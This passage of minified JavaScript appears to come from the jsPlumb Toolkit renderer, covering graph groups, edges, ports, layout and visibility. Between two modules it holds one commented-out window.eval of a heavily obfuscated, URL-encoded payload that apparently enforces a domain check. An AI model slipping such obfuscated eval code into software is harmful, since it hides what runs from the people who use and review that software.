                        id: b.id
                    }, c),
                    u.fire(l.groupAdded, i)
                }
                return d
            };
            v.bind(l.groupAdded, function(a) {
                var b = a.group
                  , c = ka(b, a.eventInfo);
                null != c && u.refresh(!0)
            }),
            v.bind(l.groupRemoved, function(a) {
                var b = a.group;
                u.getLayout().groupRemoved(b.id);
                var c = U[b.id]
                  , d = J.getId(c);
                J.removeGroup(b.id, a.removeChildNodes, !0, !1),
                delete U[b.id],
                delete W[d],
                delete c.jtk,
                u.refresh(!0)
            }),
            this.expandGroup = function(a) {
                J.expandGroup("string " == typeof a ? a : a.id)
            }
            ,
            this.collapseGroup = function(a) {
                J.collapseGroup("string " == typeof a ? a : a.id)
            }
            ,
            this.toggleGroup = function(a) {
                J.toggleGroup("string " == typeof a ? a : a.id)
            }
            ;
            var la = function(a, b) {
                for (var c, d, e = a.getNodes(), f = 0, g = 0, h = u.getLayout(), i = J.getGroup(a.id), j = i.getDragArea(), k = 0; k < e.length; k++)
                    c = h.getPosition(e[k].id),
                    isNaN(c[0]) || isNaN(c[1]) || (d = h.getSize(e[k].id),
                    f = Math.max(f, c[0] + d[0]),
                    g = Math.max(g, c[1] + d[1]));
                f = b.maxSize ? Math.min(b.maxSize[0], f) : f,
                g = b.maxSize ? Math.min(b.maxSize[1], g) : g,
                j.style.width = f + "px",
                j.style.height = g + "px",
                h.setSize(a.id, [f, g])
            }
              , ma = function() {
                for (var a in U) {
                    var b = v.getGroup(a);
                    if (b) {
                        var c = oa.getGroupDefinition(v.getNodeType(b.data));
                        c.autoSize && la(b, c)
                    }
                }
            };
            u.autoSizeGroups = ma;
            var na = function(a, b) {
                return function() {
                    var c = ra(a);
                    c.doNotFireConnectionEvent = !0,
                    b && (c.geometry = b),
                    v.isDebugEnabled() && console.log("Renderer", "adding edge with params", c);
                    var d = J.connect(c);
                    d.edge = a,
                    Z[a.getId()] = d,
                    ba(c.type, a, d),
                    u.fire(l.edgeAdded, {
                        source: a.source,
                        target: a.target,
                        connection: d,
                        edge: a,
                        geometry: b
                    }),
                    u.refresh(!0)
                }
            };
            v.bind(l.edgeAdded, function(b) {
                if (!Q && b.source !== u) {
                    var c = b.edge
                      , d = oa.getEdgeDefinition(v.getEdgeType(c.data || {}));
                    if (d && d.ignore === !0)
                        return;
                    var e = na(c, b.geometry);
                    a.connectionHandler ? a.connectionHandler(c, e) : e()
                }
            }),
            v.bind(l.edgeRemoved, function(a) {
                if (!Q && a.source !== u) {
                    var b = a.edge
                      , c = Z[b.getId()];
                    c && (v.isDebugEnabled() && console.log("Renderer", "removing edge", b),
                    ca(c, b),
                    J.deleteConnection(Z[b.getId()], {
                        fireEvent: !1
                    }),
                    delete Z[b.getId()])
                }
            }),
            v.bind(l.edgeTypeChanged, function(a) {
                if (!Q && a.source !== u) {
                    var b = a.obj
                      , c = Z[b.getId()];
                    if (c) {
                        var d = oa.getEdgeDefinition(a.newType);
                        if (d && d.ignore === !0)
                            return;
                        c.setType(a.newType),
                        d.connector && c.setConnector(d.connector)
                    }
                }
            }),
            v.bind(l.edgeTarget, function(a) {
                if (!Q) {
                    var b = a.edge
                      , c = Z[b.getId()]
                      , d = R[b.target.getFullId()];
                    c ? J.silently(function() {
                        null != d ? (v.isDebugEnabled() && console.log("target change", c),
                        J.setTarget(c, d)) : (delete Z[b.getId()],
                        J.detach({
                            connection: c,
                            forceDetach: !0,
                            fireEvent: !1
                        }))
                    }) : null != d && v.isDebugEnabled() && e.log("Target for Edge " + b.getId() + " changed to Node " + d.id + "; we have no valid connection.")
                }
            }),
            v.bind(l.edgeSource, function(a) {
                if (!Q) {
                    var b = a.edge
                      , c = Z[b.getId()]
                      , d = R[b.source.getFullId()];
                    c ? J.silently(function() {
                        null != d ? J.setSource(c, d) : (delete Z[b.getId()],
                        J.detach({
                            connection: c,
                            forceDetach: !0,
                            fireEvent: !1
                        }))
                    }) : null != d && v.isDebugEnabled() && e.log("Source for Edge " + b.getId() + " changed to Node " + d.id + "; we have no valid connection.")
                }
            }),
            v.bind("graphClearStart", function() {
                for (var a in U)
                    "undefined" != typeof U[a]._rotors && t.remove(U[a]),
                    J.silently(function() {
                        J.getGroupManager().removeGroup(a)
                    }),
                    delete U[a].jtk;
                for (var b in R)
                    "undefined" != typeof R[b]._rotors && t.remove(R[b]),
                    J.remove(R[b], !0),
                    delete R[b].jtk;
                w && w.clear(),
                J.setSuspendEvents(!0),
                J.batch(J.deleteEveryEndpoint, !0),
                J.setSuspendEvents(!1),
                X.length = 0,
                V.length = 0,
                Z = {},
                R = {},
                U = {},
                S = {},
                W = {},
                T = {},
                xa = {}
            }),
            v.bind(l.portAdded, function(a) {
                var b = R[a.node.id] || U[a.node.id]
                  , c = oa.getPortDefinition(v.getPortType(a.data));
                if (c.isEndpoint)
                    m(new Aa(a.data,b,a.port), a.node);
                else {
                    var d = ua(a.port, a.data, a.node);
                    T[a.node.id + v.getGraph().getPortSeparator() + a.port.id] = d,
                    Ba(J.getElement(d), a.node),
                    u.fire(l.portAdded, {
                        node: a.node,
                        nodeEl: b,
                        port: a.port,
                        portEl: d
                    })
                }
                J.recalculateOffsets(b),
                u.refresh(!0)
            }),
            v.bind(l.portRemoved, function(a) {
                var b = R[a.node.id] || U[a.node.id]
                  , c = a.node.id + "." + a.port.id
                  , d = T[c];
                J.setSuspendEvents(!0),
                J.remove(d),
                J.setSuspendEvents(!1),
                delete T[c],
                u.fire(l.portRemoved, {
                    node: a.node,
                    port: a.port,
                    portEl: d,
                    nodeEl: b
                }),
                J.recalculateOffsets(b),
                u.refresh(!0)
            }),
            v.bind(l.edgeUpdated, function(a) {
                var b = Z[a.edge.getId()];
                if (b) {
                    var c = ra(a.edge);
                    b.setType(c.type, c.data)
                }
            }),
            v.bind(l.portUpdated, function(a) {
                var b = T[a.port.getFullId()];
                b && (t.update(b, a.port.data),
                u.repaint(R[a.node.id]))
            }),
            v.bind(l.nodeUpdated, function(a) {
                var b = R[a.node.getFullId()];
                if (b) {
                    t.update(b, a.node.data),
                    Ba(b, a.node);
                    var c = E(a.node);
                    if (null != c) {
                        var d = e.isArray(c) ? c : [c];
                        d.unshift(b),
                        J.setPosse.apply(J, d)
                    } else
                        J.removeFromAllPosses(b);
                    u.repaint(b)
                }
            })
        }
        var oa;
        this.setView = function(a) {
            var b = e.merge(v.getModel(), a || {});
            oa = new c.Model(b,J)
        }
        ,
        this.setView(a.view),
        this.getView = function() {
            return oa
        }
        ;
        var pa = []
          , qa = function(a) {
            return null == a ? v : "string" == typeof a ? v.select(a, !0) : a.jtk ? v.select(a.jtk.port || a.jtk.node, !0) : a
        };
        this.activateState = function(a, b) {
            var c = oa.getState(a);
            c && (b = qa(b),
            c.activate(b, u, v),
            pa.push(c))
        }
        ,
        this.deactivateState = function(a, b) {
            var c = oa.getState(a);
            c && (b = qa(b),
            c.deactivate(b, u, v),
            e.removeWithFunction(pa, function(a) {
                return a == c
            }))
        }
        ,
        this.resetState = function() {
            for (var a = 0; a < pa.length; a++)
                pa[a].deactivate(v, u, v);
            pa.length = 0
        }
        ;
        var ra = function(a) {
            var b = v.getEdgeType(a.data)
              , c = {
                type: b,
                connectionType: b,
                data: a.data,
                cost: a.getCost(),
                directed: a.isDirected()
            }
              , d = oa.getEdgeDefinition(b);
            !function(a) {
                if (d)
                    for (var b = 0; b < a.length; b++)
                        d[a[b]] && (c[a[b]] = d[a[b]])
            }(["connector", "endpoints", "endpoint", "endpointStyles", "endpointStyle"]),
            c.anchor && !c.anchors && (c.anchors = [c.anchor, c.anchor],
            delete c.anchor),
            c.endpoint && !c.endpoints && (c.endpoints = [c.endpoint, c.endpoint],
            delete c.endpoint);
            var e = function(a, b, c, d, e) {
                if (d && d[c]) {
                    var f = a[b] || [d[c], d[c]];
                    f[e] = d[c],
                    a[b] = f
                }
            }
              , f = function(b, d) {
                if (a[b].getNode) {
                    var f = a[b].getNode()
                      , g = a[b].getFullId()
                      , h = xa[g] || T[g];
                    null != h ? c[b] = h : c[b] = T[g],
                    null == c[b] && (c[b] = R[v.getNodeId(f.data)]);
                    var i = oa.getPortDefinition(a[b].getType());
                    e(c, "anchors", "anchor", i, d),
                    e(c, "endpoints", "endpoint", i, d)
                } else {
                    var j = v.getNodeId(a[b].data);
                    c[b] = R[j] || U[j]
                }
            };
            return f("source", 0),
            f("target", 1),
            c
        }
          , sa = function(a, b, c, d, e, g, h, i) {
            return function(j, k, l) {
                var m, n = b(k), o = null, p = c(k), q = oa[d](p), r = k;
                if (D) {
                    r = f.extend({}, q ? q.parameters || {} : {}),
                    f.extend(r, k);
                    var s = {};
                    for (m in r)
                        r.hasOwnProperty(m) && null != r[m] && (r[m].constructor == Function ? s[m] = r[m](k) : s[m] = r[m]);
                    r = s
                }
                if (q) {
                    var t = q.template || "jtk-template-" + p;
                    o = q.templateRenderer ? q.templateRenderer(t, r, v, a) : C.render(t, r, v, a)
                } else
                    o = e(r, n);
                o = J.getElement(o),
                o.setAttribute(i, n),
                f.addClass(o, h),
                o.jtk = o.jtk || {},
                o.jtk[a] = j,
                o.jtk.node = l,
                g && y && Ea.makeDraggable && Ea.makeDraggable(o, q.dragOptions),
                z && Ea.makeDroppable && Ea.makeDroppable(o, q.dropOptions);
                var w = function(a) {
                    J.on(o, a, function(b) {
                        q.events[a]({
                            node: l,
                            el: o,
                            e: b,
                            toolkit: v,
                            renderer: u
                        })
                    })
                };
                if (q && q.events)
                    for (m in q.events)
                        w(m);
                return o
            }
        }
          , ta = sa("node", v.getNodeId, v.getNodeType, "getNodeDefinition", p, !0, j.NODE, h.NODE)
          , ua = sa("port", v.getPortId, v.getPortType, "getPortDefinition", p, !1, j.PORT, h.PORT)
          , va = sa("group", v.getNodeId, v.getNodeType, "getGroupDefinition", p, !1, j.GROUP, h.GROUP);
        this.initialize = function() {
            var b, c, d, e, f;
            if (v.setSuspendGraph(!0),
            J.setSuspendDrawing(!0),
            a.jsPlumbInstance) {
                var g = a.jsPlumbInstance.select();
                g.each(function(a) {
                    Z[a.edge.getId()] = a
                }),
                c = a.jsPlumbInstance.getManagedElements();
                for (var h in c) {
                    var i = c[h].el;
                    R[i.jtk.node.id] = i,
                    S[a.jsPlumbInstance.getId(i)] = i.jtk.node
                }
                Ea.doImport && Ea.doImport(R, Z)
            } else {
                for (b = 0,
                d = v.getGroupCount(); b < d; b++)
                    e = v.getGroupAt(b),
                    ka(e);
                for (b = 0,
                d = v.getNodeCount(); b < d; b++)
                    c = v.getNodeAt(b),
                    ia(c);
                for (b = 0,
                d = v.getNodeCount(); b < d; b++)
                    if (c = v.getNodeAt(b),
                    R[c.id]) {
                        var j = v.getAllEdgesFor(c);
                        for (f = 0; f < j.length; f++)
                            if (j[f].source == c || j[f].source.getNode && j[f].source.getNode() == c) {
                                var k = oa.getEdgeDefinition(v.getNodeType(j[f].data));
                                if (k && k.ignore === !0)
                                    continue;
                                var l = ra(j[f]);
                                l.doNotFireConnectionEvent = !0;
                                var m = J.connect(l);
                                null != m && (m.edge = j[f],
                                Z[j[f].getId()] = m,
                                ba(l.type, j[f], m))
                            }
                    }
            }
            ma(),
            this.relayout(),
            J.setSuspendDrawing(!1, !0),
            v.setSuspendGraph(!1)
        }
        ,
        this.getContainer = function() {
            return x
        }
        ,
        this.getContainerId = function() {
            return K
        }
        ,
        this.getRenderedElement = function(a) {
            if (null == a)
                return null;
            var b = a.getFullId();
            return "Port" === a.objectType ? T[b] : "Group" === a.objectType ? U[b] : R[b]
        }
        ,
        this.getRenderedNode = function(a) {
            return R[a]
        }
        ,
        this.getRenderedGroup = function(a) {
            return U[a]
        }
        ,
        this.getRenderedPort = function(a) {
            return T[a]
        }
        ,
        this.getRenderedConnection = function(a) {
            return Z[a]
        }
        ,
        this.getRenderedEndpoint = function(a) {
            var b = Da(a)
              , c = null;
            return b && b.obj && "Port" === b.obj.objectType && J.selectEndpoints({
                element: b.el
            }).each(function(a) {
                a.graph && a.graph.port && a.graph.port === b.obj && (c = a)
            }),
            c
        }
        ;
        var wa = function(a) {
            var b = J.extend({
                container: x,
                getElementForNode: function(a) {
                    return R[a] || U[a]
                }
            }, a);
            if (b.jsPlumbToolkit = v,
            b.adapter = u,
            !c.Layouts[b.type])
                throw "no such layout [" + b.type + "]";
            return b.locationFunction || (b.locationFunction = function(a) {
                return [g.data(a.data, F), g.data(a.data, G)]
            }
            ),
            new c.Layouts[b.type](b)
        };
        this.adHocLayout = function(a) {
            if (a) {
                var b = w;
                this.setLayout(a),
                w = b
            }
        }
        ,
        this.setLayout = function(a, b) {
            if (a) {
                var c = f.extend({
                    jsPlumb: this.getJsPlumb()
                }, a);
                w = wa(c),
                b || u.refresh()
            }
        }
        ,
        this.getLayout = function() {
            return w
        }
        ,
        this.getMagnetizedElements = function() {
            return null != w ? w.getMagnetizedElements() : []
        }
        ,
        this.magnetize = function(a) {
            null != w && w.magnetize(a)
        }
        ,
        this.refresh = function(a) {
            A || a && !B || (w ? w.layout(function() {
                "undefined" != typeof window ? window.setTimeout(J.repaintEverything, 0) : J.repaintEverything()
            }) : J.repaintEverything())
        }
        ,
        this.setRefreshAutomatically = function(a) {
            B = a
        }
        ,
        this.relayout = function(a) {
            A || (w ? w.relayout(a, function() {
                J.repaintEverything(),
                this.fire("relayout", this.getBoundsInfo())
            }
            .bind(this)) : J.repaintEverything())
        }
        ,
        this.getPath = function(a) {
            var b = v.getPath(a);
            return b && (b.setVisible = function(a) {
                u.setVisible(b, a)
            }
            ,
            b.addNodeClass = function(a) {
                b.eachNode(function(b, c) {
                    J.addClass(R[c.id], a)
                })
            }
            ,
            b.removeNodeClass = function(a) {
                b.eachNode(function(b, c) {
                    J.removeClass(R[c.id], a)
                })
            }
            ,
            b.addEdgeClass = function(a) {
                b.eachEdge(function(b, c) {
                    Z[c.getId()].addClass(a)
                })
            }
            ,
            b.removeEdgeClass = function(a) {
                b.eachEdge(function(b, c) {
                    Z[c.getId()].removeClass(a)
                })
            }
            ,
            b.addClass = function(a) {
                this.addNodeClass(a),
                this.addEdgeClass(a)
            }
            ,
            b.removeClass = function(a) {
                this.removeNodeClass(a),
                this.removeEdgeClass(a)
            }
            ),
            b
        }
        ,
        this.getPosition = function(a) {
            var b = this.getLayout();
            if (b) {
                var c = Da(a).id;
                return b.getPosition(c)
            }
        }
        ,
        this.getSize = function(a) {
            return J.getSize(Da(a).el)
        }
        ,
        this.getCoordinates = function(a) {
            var b = this.getLayout();
            if (b) {
                var c = Da(a)
                  , d = b.getPosition(c.id)
                  , e = J.getSize(c.el);
                return {
                    x: d[0],
                    y: d[1],
                    w: e[0],
                    h: e[1]
                }
            }
        }
        ;
        var xa = {}
          , ya = function(a, b, c) {
            var g = a.value("port-id")
              , h = a.value("port-type") || "default"
              , i = a.value("scope") || J.getDefaultScope()
              , j = v.getNodeType(b)
              , k = oa.getNodeDefinition(j)
              , l = oa.getPortDefinition(g, k)
              , m = oa.getPortDefinition(h, k)
              , n = e.merge(m, l)
              , o = null == n ? {} : d.populate(n, b.data)
              , p = function(a) {
                return function(c) {
                    var d = b.getPort(g)
                      , e = [{
                        portId: g,
                        nodeId: b.id,
                        port: d,
                        node: b,
                        portType: h,
                        endpoint: c.endpoint,
                        anchor: c.anchor
                    }];
                    a.apply(a, e)
                }
            }
              , q = function(a) {
                return function(b) {
                    var c = [{
                        connection: b.connection || b,
                        source: Da(b.source),
                        target: Da(b.target),
                        scope: b.scope
                    }];
                    return a.apply(a, c)
                }
            }
              , r = o.edgeType || a.value("edge-type") || "default"
              , s = {
                paintStyle: "connectorStyle",
                hoverPaintStyle: "connectorHoverStyle",
                overlays: "connectorOverlays",
                endpointStyle: "paintStyle"
            }
              , t = oa.getEdgeDefinition(r);
            if (t)
                for (var w in t) {
                    var x = s[w] || w;
                    null == o[x] && (o[x] = t[w])
                }
            if (o.connectionType = r,
            o.portId = g,
            o.portType = h,
            o.scope = i,
            o.parameters = o.parameters || {},
            o.parameters.portId = g,
            o.parameters.portType = h,
            o.parameters.edgeType = r,
            o.parameters.scope = i,
            o.parameters.nodeId = b.id,
            o.events = {},
            n.events)
                for (w in n.events)
                    o.events[w] = p(n.events[w]);
            if (n.interceptors)
                for (w in n.interceptors)
                    o[w] = q(n.interceptors[w]);
            var y = a.value("anchor-x")
              , z = a.value("anchor-y")
              , A = a.value("orientation-x")
              , B = a.value("orientation-y")
              , C = a.value("offset-x")
              , D = a.value("offset-y");
            return null != y && null != z && (o.anchor = [parseFloat(y), parseFloat(z), parseInt(A || "0", 10), parseInt(B || "0", 10), parseFloat(C || "0"), parseFloat(D || "0")]),
            f.extend(o, c || {}),
            o.events.anchorChanged = function(a) {
                u.fire("anchorChanged", {
                    portId: g,
                    nodeId: b.id,
                    portType: h,
                    node: b,
                    port: b.getPort(g),
                    endpoint: a.endpoint,
                    anchor: a.anchor
                })
            }
            ,
            o
        }
          , za = function(a) {
            this.element = a.parentNode,
            this.value = function(b, c) {
                var d = a.getAttribute(b);
                return null == d ? c : d
            }
            ,
            this.setValue = function(b, c) {
                a.setAttribute(b, c)
            }
            ,
            this.findDataValues = function(b) {
                for (var c = 0; c < a.attributes.length; c++) {
                    var d = a.attributes[c];
                    0 === d.name.indexOf("data-") && (b[d.value] = d.name.split("-")[1])
                }
            }
        }
          , Aa = function(a, b, c) {
            this.element = b,
            this.port = c,
            this.value = function(b, c) {
                var d = a[b.replace(/(\-\w)/g, function(a) {
                    return a[1].toUpperCase()
                })];
                return null == d ? c : d
            }
            ,
            this.findDataValues = function(b) {
                for (var c in a)
                    0 === c.indexOf("data-") && (b[a[c]] = c.split("-")[1])
            }
            ,
            this.setValue = function(a, c) {
                b.setAttribute(a, c)
            }
        }
          , Ba = function(a, b) {
            var c, d, e = f.getSelector(a, i.PORT), g = f.getSelector(a, i.SOURCE), h = f.getSelector(a, i.TARGET);
            for (c = 0; c < g.length; c++)
                d = new za(g[c]),
                n(d, b);
            for (c = 0; c < h.length; c++)
                d = new za(h[c]),
                o(d, b);
            for (c = 0; c < e.length; c++)
                d = new za(e[c]),
                m(d, b)
        };
        this.setLayout(a.layout, !0),
        this.storePositionsInModel = function(a) {
            a = a || {};
            var b = a.leftAttribute || "left"
              , c = a.topAttribute || "top"
              , d = w.getPositions();
            for (var e in d) {
                var f = v.getNode(e) || v.getGroup(e);
                f && (g.data(f.data, b, d[e][0]),
                g.data(f.data, c, d[e][1]))
            }
        }
        ,
        this.storePositionInModel = function(a) {
            var b = "string" == typeof a ? a : a.id
              , c = "string" == typeof a ? "left" : a.leftAttribute || "left"
              , d = "string" == typeof a ? "top" : a.topAttribute || "top"
              , e = w.getPosition(b)
              , f = v[a.group ? "getGroup" : "getNode"](b);
            return f && (g.data(f.data, c, e[0]),
            g.data(f.data, d, e[1])),
            e
        }
        ;
        var Ca = function(a, b, c, d, e, f, g) {
            return a = a || Da(b),
            a && (w.setPosition(a.id, c, d),
            e || (J.setAbsolutePosition(a.el, [c, d], f, g),
            J.revalidate(a.el))),
            a
        };
        this.setPosition = function(a, b, c, d) {
            return Ca(null, a, b, c, d)
        }
        ,
        this.animateToPosition = function(a, b, c, d) {
            var e = Da(a);
            if (e) {
                var f = w.getPosition(e.id);
                Ca(e, a, b, c, !1, [f[0], f[1]], d)
            }
        }
        ,
        this.setVisible = function(a, b, c) {
            function d(a) {
                return a.endpoints[0].element._jtkVisible !== !1 && a.endpoints[1].element._jtkVisible !== !1
            }
            function e(a, b, c) {
                if (1 === b.connections.length)
                    b.setVisible(c, !0);
                else if (c)
                    b.setVisible(!0, !0);
                else {
                    for (var d = 0; d < b.connections.length; d++)
                        if (b.connections[d] !== a && b.connections[d].isVisible())
                            return;
                    b.setVisible(!1, !0)
                }
            }
            if (null != a) {
                var f = function(a) {
                    var f = $(a);
                    if (f) {
                        var g = !b || d(f);
                        g && (f.setVisible(b),
                        c || (e(f, f.endpoints[0], b),
                        e(f, f.endpoints[1], b)))
                    }
                }
                  , g = function(a, d) {
                    if (d && (d.style.display = b ? "block" : "none",
                    d._jtkVisible = b,
                    !c))
                        for (var e = v.getAllEdgesFor(a), g = 0; g < e.length; g++)
                            f(e[g])
                }
                  , h = function(a) {
                    var c = a.getFullId()
                      , d = xa[c];
                    d.setVisible(b)
                }
                  , i = function(a) {
                    var b = Da(a);
                    switch (b.type) {
                    case "Edge":
                        f(b.obj);
                        break;
                    case "Node":
                        g(b.obj, b.el);
                        break;
                    case "Port":
                        h(b.obj)
                    }
                };
                if (a.eachNode && a.eachEdge)
                    a.eachNode(function(a, b) {
                        i(b)
                    }),
                    a.eachEdge(function(a, b) {
                        i(b)
                    });
                else if (a.length && "string" != typeof a)
                    for (var j = 0; j < a.length; j++)
                        i(a[j]);
                else
                    i(a)
            }
        }
        ;
        var Da = function(a) {
            return a instanceof J.getDefaultConnectionType() && (a = a.edge),
            v.getObjectInfo(a, function(a) {
                return a.getNode ? T[a.getFullId()] || R[a.getNode().id] : R[a.id] || U[a.id]
            })
        };
        this.addToPosse = function(a, b, c) {
            d.each(a, function(a) {
                var d = Da(a);
                d.el && J.addToPosse(d.el, {
                    id: b,
                    active: c !== !1
                })
            })
        }
        ,
        this.setPosse = function(a, b) {
            d.each(a, function(a) {
                var c = Da(a);
                c.el && J.setPosse(c.el, b)
            })
        }
        ,
        this.removeFromPosse = function(a, b) {
            d.each(a, function(a) {
                var c = Da(a);
                c.el && J.removeFromPosse(c.el, b)
            })
        }
        ,
        this.removeFromAllPosses = function(a) {
            d.each(a, function(a) {
                var b = Da(a);
                b.el && J.removeFromAllPosses(b.el)
            })
        }
        ,
        this.setPosseState = function(a, b, c) {
            d.each(a, function(a) {
                var d = Da(a);
                d.el && J.setPosseState(d.el, b, c)
            })
        }
        ;
        var Ea = {
            jsPlumb: J,
            toolkit: v,
            container: x,
            containerId: K,
            getConnectionsForEdges: _,
            getConnectionForEdge: $,
            getElement: function(a) {
                return R[a] || U[a]
            },
            getNodeForElementId: function(a) {
                return S[a]
            },
            getGroupForElementId: function(a) {
                return W[a]
            },
            getObjectInfo: Da,
            nodeMap: function() {
                return R
            },
            portMap: function() {
                return T
            },
            groupMap: function() {
                return U
            },
            reverseNodeMap: function() {
                return S
            }
        };
        return Ea
    }
    ;
    b.DOM = function(a) {
        n.apply(this, arguments),
        m.apply(this, arguments)
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = {
        webkit: {
            mac: function(a) {
                return a.deltaY / 120
            },
            win: function(a) {
                return a.deltaY / 100
            }
        },
        safari: function(a) {
            return a.wheelDeltaY / 120
        },
        firefox: {
            mac: function(a) {
                return -1 * (a.deltaY * (1 == a.deltaMode ? 25 : 1)) / 120
            },
            win: function(a) {
                return -1 * a.deltaY / 3
            }
        },
        ie: function(a) {
            return a.wheelDelta / 120
        },
        default: function(a) {
            return a.deltaY || a.wheelDelta;
        }
    }
      , c = /Mac/.test(navigator.userAgent) ? "mac" : "win"
      , d = navigator.userAgent.indexOf("Firefox") != -1 ? "firefox" : /Chrome/.test(navigator.userAgent) ? "webkit" : /Safari/.test(navigator.userAgent) ? "safari" : /WebKit/.test(navigator.userAgent) ? "webkit" : /Trident/.test(navigator.userAgent) ? "ie" : "default"
      , e = "function" == typeof b[d] ? b[d] : b[d][c]
      , f = function(a) {
        return e(a || event)
    }
      , g = function(a, b, c) {
        return function(d) {
            b && null != d.mozInputSource && 1 !== d.mozInputSource || (d.normalizedWheelDelta = f(d),
            (!c || d.metaKey || d.ctrlKey) && a(d))
        }
    }
      , h = "onwheel"in document.createElement("div") ? "wheel" : void 0 !== document.onmousewheel ? "mousewheel" : "DOMMouseScroll";
    a.addWheelListener = function(a, b, c, d) {
